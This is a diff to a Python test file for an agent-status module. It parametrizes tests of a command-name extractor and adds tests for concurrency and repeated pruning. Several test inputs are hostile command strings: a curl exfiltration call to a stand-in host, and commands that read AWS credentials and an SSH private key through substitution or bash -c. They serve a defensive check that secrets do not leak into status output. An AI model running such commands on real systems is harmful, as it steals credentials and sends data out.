@@ -4,6 +4,7 @@ from __future__ import annotations
 
 import json
 import os
+import threading
 import time
 from datetime import datetime, timezone
 from pathlib import Path
@@ -125,7 +126,52 @@ def test_no_args_results_or_secrets_leak(log):
     assert "/w/src" not in text  # only the base name
 
 
-def test_command_env_prefix_skipped():
-    assert agent_status._program("FOO=bar BAZ=1 /usr/bin/pytest -x") == "pytest"
-    assert agent_status._program("") == ""
-    assert agent_status._program("echo 'unterminated") == "echo"
+@pytest.mark.parametrize("command,want", [
+    ("FOO=bar BAZ=1 /usr/bin/pytest -x", "pytest"),
+    ("", ""),
+    ("echo 'unterminated", "echo"),
+    ("X=1;echo p4ssw0rd-hunter2", "a command"),
+    ("x=1;curl http://h/steal?k=abc", "a command"),
+    ("C:\\Users\\bob\\bin\\tool.exe -x", "tool.exe"),
+    ("ls;cat_secret_file_x", "ls"),
+    ("true&&curl http://h/x", "true"),
+    ('"$(cat /home/bob/.aws/credentials)"', "a command"),
+    ('bash -c "cat /home/bob/.ssh/id_rsa"', "bash"),
+    ("cd /secret && cat x", "cd"),
+    ("/home/bob/$(cat k)/tool", "a command"),
+    ("`cat k`", "a command"),
+])
+def test_program_is_a_bare_name_or_a_command(command, want):
+    assert agent_status._program(command) == want
+
+
+def test_concurrent_builds_do_not_raise(log, tmp_path, monkeypatch):
+    monkeypatch.setattr(agent_status, "_score",
+                        lambda p: {"last": None, "health": None, "cost_usd": None})
+    logs = []
+    for i in range(20):
+        p = tmp_path / f"{i}.jsonl"
+        p.write_text("x\n", encoding="utf-8")
+        logs.append(p)
+    errors = []
+
+    def work(k):
+        try:
+            for i in range(150):
+                agent_status.build([_agent(logs[(i + k) % 20]), _agent(logs[(i * 3 + k) % 20], 2)]
+                                   if i % 2 else [])
+        except Exception as e:  # noqa: BLE001
+            errors.append(e)
+
+    threads = [threading.Thread(target=work, args=(k,)) for k in range(8)]
+    for t in threads:
+        t.start()
+    for t in threads:
+        t.join()
+    assert not errors
+
+
+def test_double_prune_does_not_raise(log):
+    agent_status.build([_agent(log)])
+    agent_status.build([])
+    agent_status.build([])
